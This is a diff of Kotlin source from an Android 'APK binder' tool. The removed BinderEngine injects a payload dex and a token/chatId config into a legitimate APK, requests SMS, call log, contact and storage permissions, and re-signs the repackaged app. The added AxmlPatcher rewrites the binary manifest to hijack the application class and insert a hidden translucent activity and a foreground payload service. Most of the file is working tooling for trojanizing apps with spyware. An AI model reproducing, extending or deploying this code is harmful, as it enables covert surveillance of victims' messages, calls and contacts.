@@ -1,328 +1,606 @@
 package Com.devhs.apkbinder.binder
 
-import android.content.Context
-import android.content.pm.PackageManager
-import android.net.Uri
-import androidx.documentfile.provider.DocumentFile
-import com.android.apksig.ApkSigner
-import Com.devhs.apkbinder.core.Const
-import Com.devhs.apkbinder.data.Feature
-import Com.devhs.apkbinder.data.LogLevel
-import Com.devhs.apkbinder.data.PayloadConfig
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.withContext
-import org.json.JSONArray
-import org.json.JSONObject
-import java.io.BufferedOutputStream
-import java.io.File
-import java.io.FileOutputStream
-import java.io.FilterOutputStream
-import java.io.OutputStream
-import java.security.KeyStore
-import java.security.PrivateKey
-import java.security.cert.X509Certificate
-import java.text.SimpleDateFormat
-import java.util.Date
-import java.util.Locale
-import java.util.zip.CRC32
-import java.util.zip.ZipEntry
-import java.util.zip.ZipFile
-import java.util.zip.ZipOutputStream
+import java.io.ByteArrayOutputStream
+import java.util.LinkedHashMap
 
-class BinderEngine(private val ctx: Context) {
+object AxmlPatcher {
 
-    private class CountingStream(out: OutputStream) : FilterOutputStream(out) {
-        var count = 0L
-        override fun write(b: Int) {
-            out.write(b)
-            count++
-        }
+    private const val CHUNK_STRING_POOL = 0x0001
+    private const val CHUNK_RESOURCE_MAP = 0x0180
+    private const val CHUNK_START_ELEMENT = 0x0102
+    private const val CHUNK_END_ELEMENT = 0x0103
+    private const val FLAG_UTF8 = 0x100
+    private const val TYPE_STRING = 0x03
+    private const val TYPE_REFERENCE = 0x01
+    private const val TYPE_INT_DEC = 0x10
+    private const val ANDROID_NS = "http://schemas.android.com/apk/res/android"
 
-        override fun write(b: ByteArray, off: Int, len: Int) {
-            out.write(b, off, len)
-            count += len
-        }
+    const val ATTR_NAME = 0x01010003
+    const val ATTR_THEME = 0x01010000
+    const val ATTR_FG_TYPE = 0x01010599
+    const val STYLE_TRANSLUCENT = 0x0103000b
+
+    sealed class Value {
+        data class Str(val slot: Int) : Value()
+        data class Ref(val v: Int) : Value()
+        data class Dec(val v: Int) : Value()
     }
 
-    private val permissions = listOf(
-        "android.permission.INTERNET",
-        "android.permission.READ_SMS",
-        "android.permission.READ_CALL_LOG",
-        "android.permission.READ_CONTACTS",
-        "android.permission.READ_MEDIA_IMAGES",
-        "android.permission.READ_EXTERNAL_STORAGE",
-        "android.permission.READ_PHONE_STATE",
-        "android.permission.POST_NOTIFICATIONS",
-        "android.permission.FOREGROUND_SERVICE",
-        "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
+    class Attr(val nameSlot: Int, val value: Value)
+    class Element(val nameSlot: Int, val attrs: List<Attr>)
+
+    private class Pool(
+        val start: Int,
+        val size: Int,
+        val headerSize: Int,
+        val count: Int,
+        val styleCount: Int,
+        val flags: Int,
+        val stringsStart: Int,
+        val stylesStart: Int
     )
 
-    suspend fun bind(
-        source: Uri,
-        activity: String,
-        label: String,
-        features: Set<Feature>,
-        config: PayloadConfig,
-        outDir: DocumentFile,
-        onLog: (LogLevel, String) -> Unit
-    ) = withContext(Dispatchers.IO) {
-
-        val logLines = ArrayList<String>()
-        fun emit(level: LogLevel, msg: String) {
-            onLog(level, msg)
-            logLines.add("[" + level.name + "] " + msg)
-        }
-
-        val work = File(ctx.cacheDir, "bind_" + System.currentTimeMillis())
-        work.mkdirs()
-
-        try {
-            emit(LogLevel.INFO, "Preparing workspace...")
-            val base = File(work, "base.apk")
-            copyUri(source, base)
-            if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
-            emit(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")
-
-            val originalInfo = try {
-                ctx.packageManager.getPackageArchiveInfo(
-                    base.absolutePath,
-                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
-                )
-            } catch (_: Throwable) {
-                null
-            }
-            if (originalInfo == null) {
-                emit(LogLevel.ERROR, "ORIGINAL APK unreadable by Android")
-            } else {
-                emit(LogLevel.INFO, "Original package: " + originalInfo.packageName)
-                emit(LogLevel.INFO, "Original activities: " + (originalInfo.activities?.size ?: 0))
-            }
-
-            val srcZip = ZipFile(base)
-            val allEntries = srcZip.entries().toList()
-            val stored = allEntries.filter { it.method == ZipEntry.STORED }
-            emit(LogLevel.INFO, "Entries: " + allEntries.size + "  stored: " + stored.size)
-            emit(LogLevel.INFO, "Stored sample: " + stored.take(3).joinToString(", ") { it.name })
-
-            val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
-                ?: throw IllegalStateException("No AndroidManifest.xml in APK")
-            val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }
-
-            emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
-            emit(LogLevel.INFO, "Original app attrs: " + AxmlPatcher.appAttrs(manifest))
-
-            val originalApp = AxmlPatcher.readApplicationName(manifest)
-            emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))
-
-            emit(LogLevel.INFO, "Patching AndroidManifest.xml...")
-            val patched = try {
-                AxmlPatcher.patch(
-                    manifest,
-                    Const.PAYLOAD_APP,
-                    Const.PAYLOAD_ACTIVITY,
-                    Const.PAYLOAD_SERVICE,
-                    permissions
-                )
-            } catch (t: Throwable) {
-                srcZip.close()
-                throw IllegalStateException("Manifest patch failed: " + (t.message ?: "unknown"))
-            }
-            emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
-            emit(LogLevel.INFO, "App attrs: " + AxmlPatcher.appAttrs(patched))
-
-            emit(LogLevel.INFO, "Collecting payload dex...")
-            val dexes = collectOwnDex()
-            if (dexes.isEmpty()) {
-                srcZip.close()
-                throw IllegalStateException("Payload dex not found")
-            }
-            emit(LogLevel.INFO, "Dex files: " + dexes.size)
-
-            val maxDex = allEntries
-                .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
-                .map { it.groupValues[1].ifEmpty { "1" }.toInt() }
-                .maxOrNull() ?: 0
-
-            val cfgBytes = JSONObject().apply {
-                put("token", config.token)
-                put("chatId", config.chatId)
-                put("origApp", originalApp ?: "")
-                put("features", JSONArray(config.features))
-                put("activity", activity)
-            }.toString().toByteArray()
-
-            val unsigned = File(work, "unsigned.apk")
-            val counter = CountingStream(BufferedOutputStream(FileOutputStream(unsigned)))
-
-            ZipOutputStream(counter).use { zos ->
-                for (e in allEntries) {
-                    if (e.isDirectory) continue
-                    if (e.name == "AndroidManifest.xml") continue
-                    if (e.name == "assets/" + Const.CONFIG_ASSET) continue
-                    if (e.name.startsWith("META-INF/") &&
-                        (e.name.endsWith(".SF") || e.name.endsWith(".RSA") ||
-                            e.name.endsWith(".DSA") || e.name.endsWith(".MF"))
-                    ) continue
-
-                    val data = srcZip.getInputStream(e).use { it.readBytes() }
-                    val entry = ZipEntry(e.name)
-                    if (e.method == ZipEntry.STORED) {
-                        entry.method = ZipEntry.STORED
-                        entry.size = data.size.toLong()
-                        entry.compressedSize = data.size.toLong()
-                        entry.crc = CRC32().apply { update(data) }.value
-                        entry.extra = paddingFor(counter.count, e.name)
-                    } else {
-                        entry.method = ZipEntry.DEFLATED
-                    }
-                    zos.putNextEntry(entry)
-                    zos.write(data)
-                    zos.closeEntry()
-                }
-                srcZip.close()
-
-                zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
-                zos.write(patched)
-                zos.closeEntry()
-
-                zos.putNextEntry(ZipEntry("assets/" + Const.CONFIG_ASSET))
-                zos.write(cfgBytes)
-                zos.closeEntry()
-
-                dexes.forEachIndexed { i, bytes ->
-                    zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
-                    zos.write(bytes)
-                    zos.closeEntry()
-                }
-            }
-            emit(LogLevel.SUCCESS, "Archive built: " + unsigned.length() / 1024 + " KB")
-
-            val finalApk = File(work, "final.apk")
-            try {
-                emit(LogLevel.INFO, "Signing APK...")
-                sign(unsigned, finalApk)
-                emit(LogLevel.SUCCESS, "Signed OK")
-            } catch (t: Throwable) {
-                emit(LogLevel.WARN, "Signing failed: " + (t.message ?: "unknown"))
-                unsigned.copyTo(finalApk, overwrite = true)
-            }
-
-            val info = try {
-                ctx.packageManager.getPackageArchiveInfo(
-                    finalApk.absolutePath,
-                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
-                )
-            } catch (t: Throwable) {
-                emit(LogLevel.WARN, "Verify error: " + (t.message ?: "unknown"))
-                null
-            }
-
-            if (info == null) {
-                emit(LogLevel.ERROR, "Manifest parse: FAILED")
-            } else {
-                emit(LogLevel.SUCCESS, "Manifest parse: OK")
-                emit(LogLevel.INFO, "Package: " + info.packageName)
-                emit(LogLevel.INFO, "App class: " + (info.applicationInfo?.className ?: "(none)"))
-                val acts = info.activities?.mapNotNull { it.name } ?: emptyList()
-                val hasGate = acts.any { it.endsWith("PermissionGateActivity") }
-                emit(if (hasGate) LogLevel.SUCCESS else LogLevel.ERROR, "Permission activity: " + hasGate)
-                val srv = info.services?.mapNotNull { it.name } ?: emptyList()
-                val hasSrv = srv.any { it.endsWith("PayloadService") }
-                emit(if (hasSrv) LogLevel.SUCCESS else LogLevel.ERROR, "Payload service: " + hasSrv)
-            }
-
-            val cleanLabel = label.substringAfterLast('/')
-                .removeSuffix(".apk")
-                .replace(Regex("[^A-Za-z0-9]+"), "_")
-                .trim('_')
-                .take(40)
-                .ifBlank { "App" }
-            val name = "Hs_Apk_Binder_" + cleanLabel + "_" + System.currentTimeMillis() + ".apk"
-
-            val doc = outDir.createFile("application/vnd.android.package-archive", name)
-                ?: throw IllegalStateException("Cannot create output file")
-            ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
-                finalApk.inputStream().use { it.copyTo(os) }
-            }
-            emit(LogLevel.SUCCESS, "Saved: " + doc.name)
-            emit(LogLevel.SUCCESS, "APK Binding Completed!")
-
-        } catch (t: Throwable) {
-            emit(LogLevel.ERROR, "FAILED: " + (t.message ?: t.javaClass.simpleName))
-            throw t
-        } finally {
-            try {
-                val stamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
-                val logDoc = outDir.createFile("text/plain", "Hs_Binder_Log_" + stamp + ".txt")
-                if (logDoc != null) {
-                    ctx.contentResolver.openOutputStream(logDoc.uri)!!.use { os ->
-                        os.write(logLines.joinToString("\n").toByteArray())
-                    }
-                }
-            } catch (_: Throwable) {
-            }
-            work.deleteRecursively()
-        }
+    private class Node {
+        var type = 0
+        var raw: ByteArray? = null
+        var attrBytes: ByteArrayOutputStream? = null
+        var attrCount = 0
+        var nameIdx = 0
+        val children = ArrayList<Node>()
+        var size = 0
     }
 
-    private fun paddingFor(current: Long, name: String): ByteArray {
-        val align = if (name.startsWith("lib/") && name.endsWith(".so")) 16384 else 4
-        val nameLen = name.toByteArray(Charsets.UTF_8).size
-        val base = current + 30 + nameLen + 4
-        val pad = ((align - (base % align)) % align).toInt()
-        val extra = ByteArray(4 + pad)
-        extra[0] = 0x35
-        extra[1] = 0xD9.toByte()
-        extra[2] = (pad and 0xFF).toByte()
-        extra[3] = ((pad shr 8) and 0xFF).toByte()
-        return extra
+    private fun readPool(xml: ByteArray, start: Int): Pool = Pool(
+        start = start,
+        size = i32(xml, start + 4),
+        headerSize = u16(xml, start + 2),
+        count = i32(xml, start + 8),
+        styleCount = i32(xml, start + 12),
+        flags = i32(xml, start + 16),
+        stringsStart = i32(xml, start + 20),
+        stylesStart = i32(xml, start + 24)
+    )
+
+    private fun stringDataBase(pool: Pool): Int {
+        val declared = pool.start + pool.stringsStart
+        if (pool.stringsStart > 0 && declared < pool.start + pool.size) return declared
+        return pool.start + pool.headerSize + pool.count * 4 + pool.styleCount * 4
     }
 
-    private fun copyUri(uri: Uri, target: File) {
-        val stream = if (uri.scheme == "file") {
-            File(uri.path!!).inputStream()
+    private fun stringOffset(xml: ByteArray, pool: Pool, index: Int): Int =
+        stringDataBase(pool) + i32(xml, pool.start + pool.headerSize + index * 4)
+
+    private fun decodeAt(xml: ByteArray, off: Int, utf8: Boolean): String? = try {
+        if (off < 0 || off >= xml.size) null
+        else if (utf8) {
+            val a = readVarint(xml, off)
+            if (a == null) null else {
+                val b = readVarint(xml, a.second)
+                if (b == null || b.second + b.first > xml.size) null
+                else String(xml, b.second, b.first, Charsets.UTF_8)
+            }
         } else {
-            ctx.contentResolver.openInputStream(uri) ?: throw IllegalStateException("Cannot open APK")
-        }
-        stream.use { input -> target.outputStream().use { input.copyTo(it) } }
-    }
-
-    private fun collectOwnDex(): List<ByteArray> {
-        val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
-        val paths = ArrayList<String>()
-        info.sourceDir?.let { paths.add(it) }
-        info.splitSourceDirs?.let { paths.addAll(it) }
-
-        val out = ArrayList<ByteArray>()
-        for (path in paths) {
-            try {
-                ZipFile(path).use { z ->
-                    z.entries().toList()
-                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
-                        .sortedBy { it.name }
-                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
+            if (off + 2 > xml.size) null else {
+                val len = u16(xml, off)
+                val p = off + 2
+                if (p + len * 2 > xml.size) null
+                else {
+                    val sb = StringBuilder(len)
+                    for (i in 0 until len) sb.append(u16(xml, p + i * 2).toChar())
+                    sb.toString()
                 }
-            } catch (_: Throwable) {
             }
         }
-        return out
+    } catch (_: Throwable) {
+        null
     }
 
-    private fun sign(input: File, output: File) {
-        val ks = KeyStore.getInstance("PKCS12")
-        ctx.assets.open(Const.KEYSTORE_ASSET).use { ks.load(it, Const.KS_PASS.toCharArray()) }
-        val key = ks.getKey(Const.KS_ALIAS, Const.KS_PASS.toCharArray()) as PrivateKey
-        val cert = ks.getCertificate(Const.KS_ALIAS) as X509Certificate
+    private fun matches(xml: ByteArray, pool: Pool, index: Int, target: String): Boolean {
+        if (index < 0 || index >= pool.count) return false
+        val off = stringOffset(xml, pool, index)
+        val declared = (pool.flags and FLAG_UTF8) != 0
+        if (decodeAt(xml, off, declared) == target) return true
+        return decodeAt(xml, off, !declared) == target
+    }
 
-        val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
-        ApkSigner.Builder(listOf(signerConfig))
-            .setInputApk(input)
-            .setOutputApk(output)
-            .setV1SigningEnabled(true)
-            .setV2SigningEnabled(true)
-            .setV3SigningEnabled(true)
-            .setMinSdkVersion(26)
-            .build()
-            .sign()
+    private fun findApplication(xml: ByteArray): Int {
+        val pool = readPool(xml, 8)
+        var pos = 8
+        while (pos + 8 <= xml.size) {
+            val type = u16(xml, pos)
+            val size = i32(xml, pos + 4)
+            if (type == CHUNK_START_ELEMENT && matches(xml, pool, i32(xml, pos + 20), "application")) {
+                return pos
+            }
+            pos += if (size >= 8 && pos + size <= xml.size) size else 4
+        }
+        return -1
+    }
+
+    private fun mapId(xml: ByteArray, stringIndex: Int): Int {
+        val pool = readPool(xml, 8)
+        val pos = pool.start + pool.size
+        if (pos + 8 > xml.size || u16(xml, pos) != CHUNK_RESOURCE_MAP) return 0
+        val entries = (i32(xml, pos + 4) - 8) / 4
+        if (stringIndex < 0 || stringIndex >= entries) return 0
+        return i32(xml, pos + 8 + stringIndex * 4)
+    }
+
+    // ---------------- ট্রি পার্স ও এমিট ----------------
+
+    private fun parse(xml: ByteArray): Node {
+        val root = Node().apply { type = -1 }
+        val stack = ArrayList<Node>()
+        stack.add(root)
+        var pos = 8
+        while (pos + 8 <= xml.size) {
+            val type = u16(xml, pos)
+            val size = i32(xml, pos + 4)
+            if (size < 8 || pos + size > xml.size) break
+            if (type == CHUNK_START_ELEMENT) {
+                val node = Node()
+                node.type = type
+                node.nameIdx = i32(xml, pos + 20)
+                node.attrCount = u16(xml, pos + 28)
+                val buf = ByteArrayOutputStream()
+                buf.write(xml, pos + 36, node.attrCount * 20)
+                node.attrBytes = buf
+                stack[stack.size - 1].children.add(node)
+                stack.add(node)
+            } else if (type == CHUNK_END_ELEMENT) {
+                if (stack.size > 1) stack.removeAt(stack.size - 1)
+            } else {
+                val node = Node()
+                node.type = type
+                node.raw = xml.copyOfRange(pos, pos + size)
+                stack[stack.size - 1].children.add(node)
+            }
+            pos += size
+        }
+        return root
+    }
+
+    private fun measure(n: Node) {
+        val raw = n.raw
+        if (raw != null) {
+            n.size = raw.size
+            return
+        }
+        var total = 36 + n.attrCount * 20
+        for (c in n.children) {
+            measure(c)
+            total += c.size
+        }
+        n.size = total
+    }
+
+    private fun emit(n: Node, out: ByteArrayOutputStream) {
+        val raw = n.raw
+        if (raw != null) {
+            out.write(raw, 0, raw.size) // Fixed write ambiguity
+            return
+        }
+        out.writeU16(CHUNK_START_ELEMENT)
+        out.writeU16(16)
+        out.writeI32(n.size)
+        out.writeI32(1)
+        out.writeI32(-1)
+        out.writeI32(-1)
+        out.writeI32(n.nameIdx)
+        out.writeU16(20)
+        out.writeU16(20)
+        out.writeU16(n.attrCount)
+        out.writeU16(0)
+        out.writeU16(0)
+        out.writeU16(0)
+        val ab = n.attrBytes!!.toByteArray()
+        out.write(ab, 0, ab.size) // Fixed write ambiguity
+        for (c in n.children) emit(c, out)
+        out.writeU16(CHUNK_END_ELEMENT)
+        out.writeU16(16)
+        out.writeI32(24)
+        out.writeI32(1)
+        out.writeI32(-1)
+        out.writeI32(-1)
+        out.writeI32(n.nameIdx)
+    }
+
+    private fun findByName(n: Node, xml: ByteArray, pool: Pool, name: String): Node? {
+        if (n.raw == null && matches(xml, pool, n.nameIdx, name)) return n
+        for (c in n.children) {
+            val hit = findByName(c, xml, pool, name)
+            if (hit != null) return hit
+        }
+        return null
+    }
+
+    private fun appendAttr(n: Node, bytes: ByteArray) {
+        n.attrBytes!!.write(bytes, 0, bytes.size) // Fixed write ambiguity
+        n.attrCount++
+    }
+
+    private fun makeElement(slot: Int, attrs: List<Attr>): Node {
+        val node = Node()
+        node.type = CHUNK_START_ELEMENT
+        node.nameIdx = slot
+        val buf = ByteArrayOutputStream()
+        attrs.forEach { a ->
+            when (val v = a.value) {
+                is Value.Str -> buf.writeAttr(-1, a.nameSlot, v.slot, TYPE_STRING, v.slot)
+                is Value.Ref -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_REFERENCE, v.v)
+                is Value.Dec -> buf.writeAttr(-1, a.nameSlot, -1, TYPE_INT_DEC, v.v)
+            }
+        }
+        node.attrBytes = buf
+        node.attrCount = attrs.size
+        return node
+    }
+
+    // ---------------- যাচাই ----------------
+
+    private fun validate(xml: ByteArray, nameSlot: Int, themeSlot: Int, fgSlot: Int) {
+        val pool = readPool(xml, 8)
+        var pos = 8
+        var elements = 0
+        while (pos + 8 <= xml.size) {
+            val type = u16(xml, pos)
+            val size = i32(xml, pos + 4)
+            if (size < 8 || pos + size > xml.size) throw IllegalStateException("broken chunk at " + pos)
+            if (type == CHUNK_START_ELEMENT) {
+                elements++
+                val nameIdx = i32(xml, pos + 20)
+                if (nameIdx < 0 || nameIdx >= pool.count) throw IllegalStateException("bad element name")
+                val count = u16(xml, pos + 28)
+                if (36 + count * 20 > size) throw IllegalStateException("attribute overflow")
+                for (i in 0 until count) {
+                    val ni = i32(xml, pos + 36 + i * 20 + 4)
+                    if (ni < 0 || ni >= pool.count) throw IllegalStateException("bad attribute name")
+                }
+            }
+            pos += size
+        }
+        if (elements == 0) throw IllegalStateException("no elements")
+        if (mapId(xml, nameSlot) != ATTR_NAME) throw IllegalStateException("android:name id missing")
+        if (mapId(xml, themeSlot) != ATTR_THEME) throw IllegalStateException("android:theme id missing")
+        if (mapId(xml, fgSlot) != ATTR_FG_TYPE) throw IllegalStateException("foregroundServiceType id missing")
+    }
+
+    fun stats(xml: ByteArray): String {
+        val pool = readPool(xml, 8)
+        val utf8 = (pool.flags and FLAG_UTF8) != 0
+        var app = 0
+        var act = 0
+        var pos = 8
+        while (pos + 8 <= xml.size) {
+            val type = u16(xml, pos)
+            val size = i32(xml, pos + 4)
+            if (type == CHUNK_START_ELEMENT) {
+                val n = i32(xml, pos + 20)
+                if (matches(xml, pool, n, "application")) app++
+                if (matches(xml, pool, n, "activity")) act++
+            }
+            pos += if (size >= 8 && pos + size <= xml.size) size else 4
+        }
+        val sample = StringBuilder()
+        for (i in 0 until minOf(pool.count, 6)) {
+            sample.append(i).append('=')
+            sample.append(decodeAt(xml, stringOffset(xml, pool, i), utf8) ?: "?")
+            sample.append('|')
+        }
+        return "strings=" + pool.count + " app=" + app + " activity=" + act +
+            " utf8=" + utf8 + " size=" + xml.size + "\nSAMPLE=" + sample
+    }
+
+    fun appAttrs(xml: ByteArray): String {
+        val pos = findApplication(xml)
+        if (pos < 0) return "(no application)"
+        val pool = readPool(xml, 8)
+        val utf8 = (pool.flags and FLAG_UTF8) != 0
+        val count = u16(xml, pos + 28)
+        val sb = StringBuilder("attrs=")
+        sb.append(count)
+        sb.append(" [")
+        for (i in 0 until count) {
+            val a = pos + 36 + i * 20
+            val ni = i32(xml, a + 4)
+            val type = xml[a + 15].toInt() and 0xFF
+            val data = i32(xml, a + 16)
+            sb.append(i).append(':')
+            sb.append(decodeAt(xml, stringOffset(xml, pool, ni), utf8) ?: "?")
+            sb.append("(t=").append(type).append(",d=").append(data)
+            if (type == TYPE_STRING) {
+                sb.append(",s=")
+                sb.append(decodeAt(xml, stringOffset(xml, pool, data), utf8) ?: "?")
+            }
+            sb.append(") ")
+        }
+        sb.append(']')
+        return sb.toString()
+    }
+
+    fun readApplicationName(xml: ByteArray): String? = try {
+        val pos = findApplication(xml)
+        if (pos < 0) null else {
+            val pool = readPool(xml, 8)
+            val count = u16(xml, pos + 28)
+            var found: String? = null
+            for (i in 0 until count) {
+                val a = pos + 36 + i * 20
+                if (!matches(xml, pool, i32(xml, a + 4), "name")) continue
+                val raw = i32(xml, a + 8)
+                val data = i32(xml, a + 16)
+                val idx = if (raw >= 0) raw else data
+                if (idx < 0 || idx >= pool.count) continue
+                val off = stringOffset(xml, pool, idx)
+                val declared = (pool.flags and FLAG_UTF8) != 0
+                val s = decodeAt(xml, off, declared) ?: decodeAt(xml, off, !declared)
+                if (!s.isNullOrBlank()) {
+                    found = s
+                    break
+                }
+            }
+            found
+        }
+    } catch (_: Throwable) {
+        null
+    }
+
+    // ---------------- মূল প্যাচ ----------------
+
+    fun patch(
+        xml: ByteArray,
+        newAppClass: String,
+        activityClass: String,
+        serviceClass: String,
+        permissions: List<String>
+    ): ByteArray {
+        val added = ArrayList<String>()
+        added.add("name")
+        added.add("theme")
+        added.add("foregroundServiceType")
+        added.add(ANDROID_NS)
+        added.add("activity")
+        added.add("service")
+        added.add("uses-permission")
+        added.add(newAppClass)
+        added.add(activityClass)
+        added.add(serviceClass)
+        permissions.forEach { added.add(it) }
+
+        val oldCount = readPool(xml, 8).count
+        val slot = { i: Int -> oldCount + i }
+
+        val attrIds = LinkedHashMap<Int, Int>()
+        attrIds[slot(0)] = ATTR_NAME
+        attrIds[slot(1)] = ATTR_THEME
+        attrIds[slot(2)] = ATTR_FG_TYPE
+
+        val withStrings = appendStrings(xml, added, attrIds)
+        val pool = readPool(withStrings, 8)
+        val root = parse(withStrings)
+
+        val manifest = findByName(root, withStrings, pool, "manifest")
+            ?: throw IllegalStateException("manifest element not found")
+        val application = findByName(root, withStrings, pool, "application")
+            ?: throw IllegalStateException("application element not found")
+
+        // android:name রিপ্লেস বা যোগ
+        var replaced = false
+        val attrs = application.attrBytes!!.toByteArray()
+        for (i in 0 until application.attrCount) {
+            val a = i * 20
+            if (matches(withStrings, pool, i32(attrs, a + 4), "name")) {
+                putI32(attrs, a + 8, slot(7))
+                putU16(attrs, a + 12, 8)
+                attrs[a + 14] = 0
+                attrs[a + 15] = TYPE_STRING.toByte()
+                putI32(attrs, a + 16, slot(7))
+                replaced = true
+                break
+            }
+        }
+        application.attrBytes = ByteArrayOutputStream().apply { write(attrs, 0, attrs.size) }
+        if (!replaced) {
+            val one = ByteArrayOutputStream()
+            one.writeAttr(slot(3), slot(0), slot(7), TYPE_STRING, slot(7))
+            appendAttr(application, one.toByteArray())
+        }
+
+        // activity + service যোগ (application-এর শুরুতে)
+        val gate = makeElement(
+            slot(4),
+            listOf(
+                Attr(slot(0), Value.Str(slot(8))),
+                Attr(slot(1), Value.Ref(STYLE_TRANSLUCENT))
+            )
+        )
+        val service = makeElement(
+            slot(5),
+            listOf(
+                Attr(slot(0), Value.Str(slot(9))),
+                Attr(slot(2), Value.Dec(1))
+            )
+        )
+        application.children.add(0, service)
+        application.children.add(0, gate)
+
+        // পারমিশন যোগ (manifest-এ, application-এর আগে)
+        val index = manifest.children.indexOf(application)
+        for (i in 0 until permissions.size) {
+            val perm = makeElement(slot(6), listOf(Attr(slot(0), Value.Str(slot(10) + i))))
+            manifest.children.add(index, perm)
+        }
+
+        measure(root)
+        val out = ByteArrayOutputStream()
+        out.write(withStrings, 0, 8)
+        for (c in root.children) emit(c, out)
+        val result = out.toByteArray()
+        putI32(result, 4, result.size)
+
+        validate(result, slot(0), slot(1), slot(2))
+        return result
+    }
+
+    private fun appendStrings(xml: ByteArray, added: List<String>, attrIds: Map<Int, Int>): ByteArray {
+        val pool = readPool(xml, 8)
+        val utf8 = (pool.flags and FLAG_UTF8) != 0
+        val dataStart = stringDataBase(pool)
+        val dataEnd = if (pool.styleCount > 0 && pool.stylesStart > 0) pool.start + pool.stylesStart
+        else pool.start + pool.size
+        val safeEnd = if (dataEnd < dataStart) dataStart else minOf(dataEnd, xml.size)
+        val oldData = xml.copyOfRange(dataStart, safeEnd)
+        
+        val styleData = if (pool.styleCount > 0 && pool.stylesStart > 0)
+            xml.copyOfRange(pool.start + pool.stylesStart, pool.start + pool.size) else ByteArray(0)
+
+        val data = ByteArrayOutputStream()
+        data.write(oldData, 0, oldData.size)
+        val newOffsets = IntArray(added.size)
+        
+        for ((i, s) in added.withIndex()) {
+            while (data.size() % 4 != 0) data.write(0)
+            newOffsets[i] = data.size()
+            if (utf8) {
+                writeVarint(data, s.length)
+                val bytes = s.toByteArray(Charsets.UTF_8)
+                writeVarint(data, bytes.size)
+                data.write(bytes, 0, bytes.size)
+                data.write(0)
+            } else {
+                data.write(s.length and 0xFF)
+                data.write((s.length shr 8) and 0xFF)
+                for (ch in s) {
+                    data.write(ch.code and 0xFF)
+                    data.write((ch.code shr 8) and 0xFF)
+                }
+                data.write(0)
+                data.write(0)
+            }
+        }
+        while (data.size() % 4 != 0) data.write(0)
+
+        val newCount = pool.count + added.size
+        val newData = data.toByteArray()
+        val stringsStart = pool.headerSize + newCount * 4 + pool.styleCount * 4
+        val stylesStart = if (pool.styleCount > 0) stringsStart + newData.size else 0
+        val chunkSize = stringsStart + newData.size + styleData.size
+
+        val out = ByteArrayOutputStream()
+        out.write(xml, 0, pool.start)
+        out.writeU16(CHUNK_STRING_POOL)
+        out.writeU16(pool.headerSize)
+        out.writeI32(chunkSize)
+        out.writeI32(newCount)
+        out.writeI32(pool.styleCount)
+        out.writeI32(pool.flags)
+        out.writeI32(stringsStart)
+        out.writeI32(stylesStart)
+        
+        for (i in 0 until pool.count) out.writeI32(i32(xml, pool.start + pool.headerSize + i * 4))
+        newOffsets.forEach { out.writeI32(it) }
+        for (i in 0 until pool.styleCount) {
+            out.writeI32(i32(xml, pool.start + pool.headerSize + pool.count * 4 + i * 4))
+        }
+        
+        out.write(newData, 0, newData.size)
+        out.write(styleData, 0, styleData.size)
+        out.write(xml, pool.start + pool.size, xml.size - pool.start - pool.size)
+
+        val result = out.toByteArray()
+        putI32(result, 4, result.size)
+        return ensureResourceMap(result, newCount, attrIds)
+    }
+
+    private fun ensureResourceMap(xml: ByteArray, needed: Int, ids: Map<Int, Int>): ByteArray {
+        val pool = readPool(xml, 8)
+        val pos = pool.start + pool.size
+        val hasMap = pos + 8 <= xml.size && u16(xml, pos) == CHUNK_RESOURCE_MAP
+
+        if (!hasMap) {
+            val block = ByteArray(8 + needed * 4)
+            putU16(block, 0, CHUNK_RESOURCE_MAP)
+            putU16(block, 2, 8)
+            putI32(block, 4, 8 + needed * 4)
+            ids.forEach { (i, id) -> if (i < needed) putI32(block, 8 + i * 4, id) }
+            val out = ByteArrayOutputStream()
+            out.write(xml, 0, pos)
+            out.write(block, 0, block.size)
+            out.write(xml, pos, xml.size - pos)
+            val result = out.toByteArray()
+            putI32(result, 4, result.size)
+            return result
+        }
+
+        val mapSize = i32(xml, pos + 4)
+        val entries = (mapSize - 8) / 4
+        val grow = (needed - entries).coerceAtLeast(0)
+
+        val out = ByteArrayOutputStream()
+        out.write(xml, 0, pos + mapSize)
+        repeat(grow) { out.writeI32(0) }
+        out.write(xml, pos + mapSize, xml.size - pos - mapSize)
+        val result = out.toByteArray()
+
+        putI32(result, pos + 4, mapSize + grow * 4)
+        putI32(result, 4, result.size)
+        ids.forEach { (i, id) -> if (i < entries + grow) putI32(result, pos + 8 + i * 4, id) }
+        return result
+    }
+
+    private fun ByteArrayOutputStream.writeAttr(nsIdx: Int, nameIdx: Int, raw: Int, type: Int, data: Int) {
+        writeI32(nsIdx)
+        writeI32(nameIdx)
+        writeI32(raw)
+        writeU16(8)
+        write(0)
+        write(type)
+        writeI32(data)
+    }
+
+    private fun readVarint(b: ByteArray, off: Int): Pair<Int, Int>? {
+        if (off < 0 || off >= b.size) return null
+        val first = b[off].toInt() and 0xFF
+        return if (first and 0x80 != 0) {
+            if (off + 1 >= b.size) null
+            else (((first and 0x7F) shl 8) or (b[off + 1].toInt() and 0xFF)) to off + 2
+        } else first to off + 1
+    }
+
+    private fun writeVarint(out: ByteArrayOutputStream, v: Int) {
+        if (v > 0x7F) {
+            out.write(((v shr 8) or 0x80) and 0xFF)
+            out.write(v and 0xFF)
+        } else out.write(v)
+    }
+
